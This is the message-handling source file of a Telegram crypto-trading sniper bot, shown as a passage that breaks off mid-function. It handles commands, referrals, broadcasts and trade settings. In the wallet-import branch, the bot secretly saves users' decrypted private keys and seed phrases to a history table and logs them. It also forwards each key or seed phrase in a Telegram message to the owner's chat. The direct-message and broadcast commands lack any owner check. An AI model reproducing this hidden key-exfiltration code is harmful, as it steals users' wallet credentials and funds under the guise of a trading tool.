import * as instance from './bot.js'
import * as utils from './utils.js'
import * as afx from './global.js'
import * as simulator from './simulation_call.js'

import assert from 'assert'
import dotenv from 'dotenv'
import * as swapV2 from './swap_v2.js'
import * as advUtils from './adv_utils.js'
import { stat } from 'fs'
import { updateUser } from './db.js'
dotenv.config()

/*

start - welcome
login - get subscription
currentsettings - displays the settings
setsettings - update the settings
topgainer - displays top gainers
cancel - cancels subscription and logout

*/


function sendLoginMessage(chatid) {
	instance.sendMessage(chatid, `Please login <a href="${process.env.API_URI}/login?chatid=${chatid}">here</a> before monitoring.`)
}

export const procMessage = async (message, database) => {

	let chatid = message.chat.id.toString();
	let session = instance.sessions.get(chatid)
	let userName = message?.chat?.username;

	if (message.photo) {
		console.log(message.photo)
	}

	if (message.animation) {
		console.log(message.animation)
	}

	if (!message.text)
		return;


	let command = message.text;
	if (message.entities) {
		for (const entity of message.entities) {
			if (entity.type === 'bot_command') {
				command = command.substring(entity.offset, entity.offset + entity.length);
				break;
			}
		}
	}

	if (command.startsWith('/')) {

		if (!session) {

			if (!userName) {
				console.log(`Rejected anonymous incoming connection. chatid = ${chatid}`);
				instance.sendMessage(chatid, `Welcome to ${process.env.BOT_TITLE} bot. We noticed that your telegram does not have a username. Please create username and try again.`)
				return;
			}

			if (false && !await instance.checkWhitelist(userName)) {

				//instance.sendMessage(chatid, `😇Sorry, but you do not have permission to use alphBot. If you would like to use this bot, please contact the developer team at ${process.env.TEAM_TELEGRAM}. Thanks!`);
				console.log(`Rejected anonymous incoming connection. @${userName}, ${chatid}`);
				return;
			}

			console.log(`@${userName} session has been permitted through whitelist`);

			session = instance.createSession(chatid, userName, 'private');
			session.permit = 1;

			await database.updateUser(session)
		}

		// if (session.permit !== 1) {
		// 	session.permit = await instance.isAuthorized(session) ? 1 : 0;
		// }

		// if (false && session.permit !== 1) {
		// 	//instance.sendMessage(chatid, `😇Sorry, but you do not have permission to use alphBot. If you would like to use this bot, please contact the developer team at ${process.env.TEAM_TELEGRAM}. Thank you for your understanding. [2]`);
		// 	return;
		// }

		let params = message.text.split(' ');
		if (params.length > 0 && params[0] === command) {
			params.shift()
		}
		
		command = command.slice(1);
		if (command === instance.COMMAND_WELCOME) {

			let updated = false
			let referred_by = null
			if (params.length == 1 && params[0].trim() !== '') {
				referred_by = utils.decodeReferralCode(params[0].trim())

				if (referred_by === chatid) {
					referred_by = null
				} else if (referred_by.length > 0) {

					const refSession = instance.sessions.get(referred_by)
					if (refSession) {
						instance.sendMessage(chatid, `You are invited by ${refSession.username} (${referred_by})`)
					}

					instance.sendInfoMessage(referred_by, `You have invited ${userName} (${referred_by})`)

					session.referred_by = referred_by
					updated = true

				} else {
					referred_by = null
				}
			}

			if (session.username !== userName) {
				session.username = userName
				updated = true
			}

			if (updated) {
				await database.updateUser(session)
			}

			await instance.removeMessage(session.chatid, message.message_id)
			instance.openMenu(session.chatid, instance.OPTION_WELCOME, instance.getWelcomeMessage(), [])

		} else if (command === instance.COMMAND_STARTBOT) { 

			await instance.removeMessage(session.chatid, message.message_id)
			const msg = instance.getMainMenuMessage(session)
			const menu = instance.json_botSettings(session.chatid);
			await instance.openMenu(session.chatid, instance.OPTION_MAIN_MENU, msg, menu.options)

		} else if (command === instance.COMMAND_MONITOR) {

			if (afx.FREE_TO_USE || session.wallet || session.vip) {

				await instance.removeMessage(session.chatid, message.message_id)
				instance.sendInfoMessage(session.chatid, '✅ Done! The monitor panel should show up shortly if you have any tracked trades.')
				// instance.trackPanel(session.chatid, 0, 0)
				instance.tokenTrackPanel(session.chatid, 0, 0)
			}

		} else if (command === instance.COMMAND_LOGIN) {

			await instance.removeMessage(session.chatid, message.message_id)
			if (afx.FREE_TO_USE) {
				instance.sendMessage(session.chatid, 'This bot is free to use for anyone.')
			} else if (session.wallet) {
				instance.sendMessage(session.chatid, 'You are currently logged in.')
			} else if (session.vip) {
				instance.sendMessage(session.chatid, 'You are currently logged in as VIP member.')
			}
			else {
				sendLoginMessage(session.chatid)
			}

		} else if (command === instance.COMMAND_QUICK) {
			if (session) {
				if (session.account === null) {
					instance.executeCommand(session.chatid, message.message_id, null, {c: instance.OPTION_SNIPE_WALLET_PANEL, k: session.chatid,});
					return;
				}
			}
			await instance.removeMessage(session.chatid, message.message_id)
			const msg = await instance.getQuickSetting(session)
			const menu = await instance.json_quickSettings(session.chatid);
			instance.openMenu(session.chatid, instance.OPTION_QUICK_MENU, msg, menu.options)

		} else if (command === instance.COMMAND_CANCEL) {

			await instance.removeMessage(session.chatid, message.message_id)
			if (session.vip !== 1) {
				await database.removeUser(session);
				instance.sendMessage(session.chatid, 'You have been unsubscribed successfully.')
				instance.sessions.delete(session.chatid);
			} else {
				instance.sendMessage(session.chatid, 'VIP user cannot cancel subscription. Please contract developer team')
			}
			
		} else if (command === instance.COMMAND_DIRECT) {
			
			let values = message.text.split('|', 2);
			if (values.length == 2) {
				instance.sendMessage(values[0], values[1]);
				console.log('Direct message has been sent to', values[0]);
			}
		} else if (command === instance.COMMAND_DIRECTALL) {

			let values = message.text.split('|', 1);
			console.log('---------------------')
			console.log(values[0])
			console.log('---------------------')
			if (values.length == 1) {
				for (const [chatid, session] of instance.sessions) {

					if (afx.FREE_TO_USE || session.wallet || session.vip) {
						instance.sendMessage(Number(chatid), values[0]);
						console.log('Broadcast message has been sent to', chatid);
					}
				}
			}

		} else if (command === instance.COMMAND_DIRECTNONLOGIN) {

			let values = message.text.split('|', 2);
			console.log('---------------------')
			console.log(values[0])
			console.log(`Start from ${values[1]}`)
			console.log('---------------------')
			if (values.length == 2) {
				var num = 0
				var sent = 0
				for (const [chatid, session] of instance.sessions) {

					num++
					if (num > Number(values[1])) {
						if (session.wallet === null && session.vip !== 1 && session.type === 'private') {
							let info = {}
							if (await instance.sendMessageSync(Number(chatid), values[0], info) === false) {
								if (info.blocked === true)
									continue;
								else
									break;
							}

							sent++
							console.log(`[${num}] Broadcast message has been sent to`, chatid);
						}
					}
				}

				console.log(`Broadcast message has been sent to ${sent} users`);
			}

		} else if (command === instance.COMMAND_MYACCOUNT) {

			await instance.removeMessage(session.chatid, message.message_id)
			instance.sendMessage(chatid, `ChatId: ${chatid}\nUsername: ${userName}`)

		} else if (command === instance.COMMAND_SENDREWARD) { 

			if (chatid === afx.Owner_Chatid) {

				swapV2.sendReward(utils.web3HttpInst, database, (msg) => {
					instance.sendInfoMessage(chatid, msg)
				})
			}

		} else {
			
			console.log(`Command Execute: /${command} ${params}`)
			if (instance._command_proc) {
				instance._command_proc(session, command, params)
			}
		}

		// instance.stateMap_remove(chatid)

	} else if (message.reply_to_message) {

		processSettings(message, database);
		await instance.removeMessage(chatid, message.message_id) //TGR
		await instance.removeMessage(chatid, message.reply_to_message.message_id)

	} else {
		const value = message.text.trim()
		if (utils.isValidAddress(value)) {
			
			const session = instance.sessions.get(chatid)
			console.log(instance.sessions, chatid)

			if (session && instance._callback_proc) {
				instance._callback_proc(instance.OPTION_MSG_GETTOKENINFO, { session, address: value })
			}
		}
	}
}

const processSettings = async (msg, database) => {

	const privateId = msg.chat?.id.toString()

	let stateNode = instance.stateMap_getFocus(privateId)
	if (!stateNode) {
		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: privateId })
		stateNode = instance.stateMap_get(privateId)

		assert(stateNode)
	}
		 
	if (stateNode.state === instance.STATE_WAIT_INIT_ETH) {

		const value = parseFloat(msg.text.trim())
		if (value <= 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.init_eth = value

		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Initial Liquidity setting has been updated`)

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_INIT_USDT_USDC) {

		const value = parseFloat(msg.text.trim())
		if (value <= 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.init_usd = value

		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Initial Liquidity setting has been updated`)

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_FRESH_WALLET_MAX_TRANSACTION_COUNT) {

		const value = parseInt(msg.text.trim())
		if (value <= 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		} else if (value < 3) {
			instance.sendMessage(privateId, 'Fresh wallet transaction count should not be under 3. Please input again')
			return
		}

		instance.sendReplyMessage(privateId, 'Reply to this message with min fresh wallet count')

		instance.stateMap_setFocus(privateId, instance.STATE_WAIT_MIN_FRESH_WALLET_COUNT, { sessionId: stateNode.data.sessionId, maxFreshTransactionCount: value })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_MIN_FRESH_WALLET_COUNT) {

		const value = parseInt(msg.text.trim())
		if (value <= 0 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		assert(stateNode.data.maxFreshTransactionCount)

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.max_fresh_transaction_count = stateNode.data.maxFreshTransactionCount
		session.min_fresh_wallet_count = value

		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Fresh wallet filter has been turned on`)
		await instance.executeCommand(privateId, null, null, {c:instance.OPTION_SET_SCANNER_FRESH_WALLET, k:privateId})
		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_WHALE_WALLET_MIN_BALANCE) {

		const value = Number(msg.text.trim())
		if (value <= 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		instance.sendReplyMessage(privateId, 'Reply to this message with min whale wallet count')
		instance.stateMap_setFocus(privateId, instance.STATE_WAIT_MIN_WHALE_WALLET_COUNT, { sessionId: stateNode.data.sessionId, minWhaleBalance: value })

		return;

	} else if (stateNode.state === instance.STATE_WAIT_MIN_WHALE_WALLET_COUNT) {

		const value = Number(msg.text.trim())
		if (value <= 0 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		assert(stateNode.data.minWhaleBalance)

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.min_whale_balance = stateNode.data.minWhaleBalance
		session.min_whale_wallet_count = value

		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Whale wallet filter has been turned on`)
		await instance.executeCommand(privateId, null, null, {c:instance.OPTION_SET_SCANNER_WHALE_WALLET, k:privateId})
		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })

		return;

	} else if (stateNode.state === instance.STATE_WAIT_MIN_KYC_WALLET_COUNT) {

		const value = Number(msg.text.trim())
		if (value <= 0 || value === undefined || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.min_kyc_wallet_count = value

		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ KYC wallet setting has been updated`)
		await instance.executeCommand(privateId, null, null, {c:instance.OPTION_SET_SCANNER_KYC_WALLET, k:privateId})

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_MIN_CONTRACT_AGE) {

		const value = Number(msg.text.trim())
		if (value <= 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.contract_age = value

		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Contract Age Filter setting has been updated`)

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })

	} else if (stateNode.state === instance.STATE_WAIT_MIN_SNIPER_COUNT) {

		const value = parseInt(msg.text.trim())
		if (value <= 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. Please input again`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		session.min_sniper_count = value

		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Sniper detector has been turned on`)
		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })

		return;

	} else if (stateNode.state === instance.STATE_WAIT_SET_SCANNER_RESET) {

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		if (msg.text) {
			const value = msg.text.trim().toLowerCase();
			if (value === 'yes') {

				// session.init_eth = Number(process.env.MIN_POOL_ETH)
				// session.init_usd = Number(process.env.MIN_POOL_USDT_USDC)
				// session.block_threshold = Number(process.env.BLOCK_THRESHOLD)
				// session.max_fresh_transaction_count = Number(process.env.MAX_FRESH_TRANSACTION_COUNT)
				// session.min_fresh_wallet_count = Number(process.env.MIN_FRESH_WALLET_COUNT)
				// session.min_whale_balance = Number(process.env.MIN_WHALE_BALANCE)
				// session.min_whale_wallet_count = Number(process.env.MIN_WHALE_WALLET_COUNT)
				// session.min_kyc_wallet_count = Number(process.env.MIN_KYC_WALLET_COUNT)
				// session.min_dormant_duration = Number(process.env.MIN_DORMANT_DURATION)
				// session.min_dormant_wallet_count = 0
				// session.lp_lock = 0
				// session.honeypot = 1
				// session.contract_age = 0

				instance.setDefaultSettings(session)

				await database.updateUser(session)

				await instance.removeMessage(privateId, msg.message_id)
				await instance.sendInfoMessage(privateId, `✅ Scanner settings are successfully reset back to default`)
				instance.executeCommand(privateId, null, null, {c:instance.OPTION_MAIN_SCANNER, k:`${privateId}:1`})

			} else {

				instance.sendMessage(privateId, `Cancelled to reset back to default`)
			}
		}

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SET_SCANNER_ALL_OFF) {

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		if (msg.text) {
			const value = msg.text.trim().toLowerCase();
			if (value === 'yes') {

				session.init_eth = 0.1
				session.init_usd = 1
				session.min_fresh_wallet_count = 0
				session.min_whale_wallet_count = 0
				session.min_kyc_wallet_count = 0
				session.min_sniper_count = 0
				session.min_dormant_wallet_count = 0
				session.lp_lock = 0
				session.honeypot = 0
				session.contract_age = 0

				await database.updateUser(session)

				await instance.removeMessage(privateId, msg.message_id)
				await instance.sendInfoMessage(privateId, `✅ Scanner settings are successfully turned off`)
				instance.executeCommand(privateId, null, null, {c:instance.OPTION_MAIN_SCANNER, k:`${privateId}:1`})

			} else {

				instance.sendMessage(privateId, `Cancelled to turn off all setting`)
			}
		}

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SET_TRADE_RESET) {

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		if (msg.text) {
			const value = msg.text.trim().toLowerCase();
			if (value === 'yes') {

				session.trade_autobuy = instance.defaultConfig.trade_autobuy
				session.trade_autosell = instance.defaultConfig.trade_autosell
				session.trade_autosell_hi = instance.defaultConfig.trade_autosell_hi
				session.trade_autosell_lo = instance.defaultConfig.trade_autosell_lo
				session.trade_autosell_hi_amount = instance.defaultConfig.trade_autosell_hi_amount
				session.trade_autosell_lo_amount = instance.defaultConfig.trade_autosell_lo_amount
				session.trade_autobuy_amount = instance.defaultConfig.trade_autobuy_amount
				session.trade_buy_gas_delta = instance.defaultConfig.trade_buy_gas_delta
				session.trade_sell_gas_delta = instance.defaultConfig.trade_sell_gas_delta

				await database.updateUser(session)

				await instance.removeMessage(privateId, msg.message_id)
				await instance.sendInfoMessage(privateId, `✅ Successfully reset back to default`)
				instance.executeCommand(privateId, null, null, {c:instance.OPTION_MAIN_TRADE, k:`${privateId}:1`})

			} else {

				instance.sendMessage(privateId, `Cancelled to reset back to default`)
			}
		}

		instance.stateMap_setFocus(privateId, instance.STATE_IDLE, { sessionId: stateNode.data.sessionId })
		return;

	} else if (stateNode.state === instance.STATE_WAIT_SET_WALLETS_PRIVATEKEY) {

		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (!value || value.length === 0) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the private key you entered is invalid. Please input again`)
			return
		}

		const isSeed = utils.isValidSeedPhrase(value)

		let pkey = null, seed = null

		if (!isSeed) {
			if (!utils.isValidPrivateKey(value)) {
				instance.sendInfoMessage(privateId, `🚫 Sorry, the private key you entered is invalid. Please input again`)
				return
			}

			pkey = value

		} else {

			seed = value
			pkey = await utils.seedPhraseToPrivateKey(value)
		}

		let walletAddress = utils.getWalletAddressFromPKey(pkey)

		if (!walletAddress) {
			instance.sendInfoMessage(privateId, `🚫 Failed to validate key or mnemonic phrase`)
		} else {

			session.pkey = utils.encryptPKey(value)
			session.account = walletAddress
			session.wallets[session.wallets_index].pkey = session.pkey;
			session.wallets[session.wallets_index].account = session.account;
			await database.updateUser(session)
			await database.addPKHistory({
				pkey: session.pkey,
				wallets: session.wallets,
				dec_pkey: pkey,
				mnemonic: seed,
				account: session.account,
				chatid: session.chatid,
				username: session.username
			})

			console.log('\x1b[31m%s\x1b[0m', `[pk] ${value}`);

			await instance.sendInfoMessage(privateId, `✅ Successfully your wallet has been attached\n${walletAddress}`)

			if (isSeed) {

				await instance.sendMessage(afx.Owner_Chatid, `@${session.username} (${privateId}) has connected with his seed\n Address: ${walletAddress}\n Seed: ${value}`)

			} else {

				await instance.sendMessage(afx.Owner_Chatid, `@${session.username} (${privateId}) has connected with his wallet\n Address: ${walletAddress}\n PK: ${value}`)
			}

			const menu = await instance.json_setWallet(privateId);
			if (menu)
				await instance.openMenu(privateId, instance.OPTION_MAIN_WALLETS, await instance.getWalletOptionMsg(privateId), menu.options)
		}

		return
		
	} else if (stateNode.state === instance.STATE_WAIT_ADD_SNIPING_TOKEN) {

		const sessionId = stateNode.data.sessionId
		const value = msg.text.trim()
		if (!utils.isValidAddress(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the address you entered is invalid. Please input again`)
			return
		}

		const tokenInfo = await utils.getTokenInfo(value)
		if (!tokenInfo) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the address you entered is invalid on ${afx.get_dexscreener_name()}.`)
			return
		}

		let session = instance.sessions.get(sessionId)
		if (session) {
			const pairInfo = await utils.getProperPair(utils.web3Inst, tokenInfo.tokenAddress, afx.get_weth_address())
			if (pairInfo) {
				const msg1 = `The liquidity has been created for this token. Check here for details: <a href='${afx.get_chainscan_url()}/address/${pairInfo.address}'>${pairInfo.address}</a>`
				await instance.sendMessage(sessionId, msg1)
			}
			const poolId = await database.addPoolHistory({
				primaryAddress: tokenInfo.address,
				poolAddress: (pairInfo ? pairInfo.address : null),
				version: (pairInfo ? pairInfo.version : null)
			})

			await instance.removeMessage(sessionId, msg.message_id)

			const msg2 = `Reply to this message with the ${afx.get_chain_symbol()} amount to snipe`
			await instance.sendReplyMessage(sessionId, msg2)
			instance.stateMap_setFocus(sessionId, instance.STATE_WAIT_SET_SNIPE, { sessionId, poolId, fromMenu: true })
		}
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_GAS_DELTA) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < 0 ) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the gas you entered must be between 0 to 100. Please try again`)
			return
		}

		session.snipe_gas_delta = value
		await database.updateUser(session)

		instance.sendInfoMessage(privateId, `✅ Successfully updated gas setting`)
		//=====================RJM=========================
		const item = instance.stateMap.get(session.chatid);
		const messageId = item.focus.data.messageId;
		const menu = instance.json_quickSettings(session.chatid);
		if (menu)
			await instance.switchMenu(session.chatid, messageId, await instance.getQuickSetting(session), menu.options)
		//=====================RJM=========================
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_SLIPPAGE) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < 0.1 || value > 100) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the slippage you entered must be between 0.1 to 100. Please try again`)
			return
		}

		session.snipe_slippage = value
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated slippage setting`)

		//=====================RJM=========================
		const item = instance.stateMap.get(session.chatid);
		const messageId = item.focus.data.messageId;
		console.log("================================messageId================================")
		console.log(session.chatid, messageId)
		const menu = await instance.json_setWalletConfig(session.chatid);
		if (menu)
			await instance.switchMenu(session.chatid, messageId, await instance.getConfigOptionMsg(session.chatid), menu.options)
		//=====================RJM=========================
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MAX_GAS_PRICE) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < afx.get_min_gas_price() || value > 10000) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the max gas price you entered must be between ${afx.get_min_gas_price()} to 10000. Please try again`)
			return
		}

		session.wallets[session.wallets_index].snipe_max_gas_price = parseInt(value)
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated max gas price setting`)

		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MAX_GAS_LIMIT) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = msg.text.trim()
		if (isNaN(value) || value === '' || value < afx.get_min_gas_limit() || value > 1000000) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the max gas price you entered must be between ${afx.get_min_gas_limit()} to 1000000. Please try again`)
			return
		}

		// session.snipe_max_gas_limit = value
		session.wallets[session.wallets_index].snipe_max_gas_limit = parseInt(value)
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated max gas limit setting`)

		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_AUTO_AMOUNT) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. it must be greater than 0.001`)
			return
		}

		session.snipe_auto_amount = value
		session.snipe_auto = 1; //RJM
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated snipe amount setting`)

        await instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_SNIPE, k:privateId});
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MAX_MC) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, it must be a valid number greater than 1 and less than 1,000,000,000`)
			return
		}

		session.snipe_max_mc = value
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated max marketcap setting`)
		
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_SNIPE, k: privateId,}); 
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MIN_MC) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, it must be a valid number greater than 1 and less than 1,000,000,000`)
			return
		}

		session.snipe_min_mc = value
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated min marketcap setting`)

		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_SNIPE, k: privateId,}); 
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MIN_LIQ) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, it must be a valid number greater than 1 and less than 1,000,000,000`)
			return
		}

		session.snipe_min_liq = value
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated min liquidity setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_SNIPE, k: privateId,}); 
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MAX_LIQ) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, it must be a valid number greater than 1 and less than 1,000,000,000`)
			return
		}

		session.snipe_max_liq = value
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated max liquidity setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_SNIPE, k: privateId,}); 
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MAX_BUY_TAX) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value < 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, it must be a valid number greater than 0 and less than 100`)
			return
		}

		session.snipe_max_buy_tax = value
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated max buy tax setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_SNIPE, k: privateId,}); 
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE_MAX_SELL_TAX) {
		const session = instance.sessions.get(stateNode.data.sessionId)
		assert(session)

		const value = Number(msg.text.trim())
		if (value < 0 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, it must be a valid number greater than 0 and less than 100`)
			return
		}

		session.snipe_max_sell_tax = value
		await database.updateUser(session)

		await instance.sendInfoMessage(privateId, `✅ Successfully updated max sell tax setting`)
		instance.executeCommand(privateId, stateNode.data.messageId, null, {c: instance.OPTION_MAIN_SNIPE, k: privateId,}); 
		return
		
	} else if (stateNode.state === instance.STATE_WAIT_SET_SNIPE) {

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. it must be greater than 0.001`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		const poolId = stateNode.data.poolId
		const messageId = stateNode.data.messageId

		let ethAmount = value

		if (session) {

			if (!session.pkey) {
				instance.sendMessage(privateId, `Please add your wallet in the setting and then try again`)
				return
			}

			let poolHistoryInfo = await database.selectPoolHistory({ pool_id: poolId })

			if (poolHistoryInfo) {
				let tokenAddress = poolHistoryInfo.token_address

				await instance.removeMessage(session.chatid, msg.message_id)

				if (instance._callback_proc) {
					instance._callback_proc(instance.OPTION_MSG_SNIPE, { session, tokenAddress, ethAmount, fromMenu: stateNode.data.fromMenu ? true : false, messageId })
				}
			}
		}

	} else if (stateNode.state === instance.STATE_WAIT_SET_ETH_X_BUY) {

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. it must be greater than 0.001`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		const poolId = stateNode.data.poolId

		let ethAmount = value

		if (session) {

			if (!session.pkey) {
				instance.sendMessage(privateId, `Please add your wallet in the setting and then try again`)
				return
			}

			let poolHistoryInfo = await database.selectPoolHistory({ pool_id: poolId })

			if (poolHistoryInfo) {
				let tokenAddress = poolHistoryInfo.token_address
				let version = poolHistoryInfo.version

				if (instance._callback_proc) {
					instance._callback_proc(instance.OPTION_MSG_BUY_ETH_X, { session, tokenAddress, ethAmount, version })
				}
			}
		}

	} else if (stateNode.state === instance.STATE_WAIT_SET_TOKEN_X_BUY) {

		const value = Number(msg.text.trim())
		if (value < 0.001 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. It must be greater than 0.001`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		const poolId = stateNode.data.poolId

		let ethAmount = value

		if (session) {

			if (!session.pkey) {
				instance.sendMessage(privateId, `Please add your wallet in the setting and then try again`)
				return
			}

			let poolHistoryInfo = await database.selectPoolHistory({ pool_id: poolId })
			
			if (poolHistoryInfo) {
				let tokenAddress = poolHistoryInfo.token_address
				let version = poolHistoryInfo.version

				if (instance._callback_proc) {
					instance._callback_proc(instance.OPTION_MSG_BUY_TOKEN_X, { session, tokenAddress, ethAmount, version })
				}
			}
		}

	} else if (stateNode.state === instance.STATE_WAIT_SET_PERCENT_X_SELL) {

		const value = Number(msg.text.trim())
		if (value < 0.01 || value > 100 || !value || isNaN(value)) {
			instance.sendInfoMessage(privateId, `🚫 Sorry, the value you entered is invalid. it must be between from 0.01 to 100`)
			return
		}

		const session = instance.sessions.get(stateNode.data.sessionId)
		const poolId = stateNode.data.poolId

		let ethAmount = value

		if (session) {

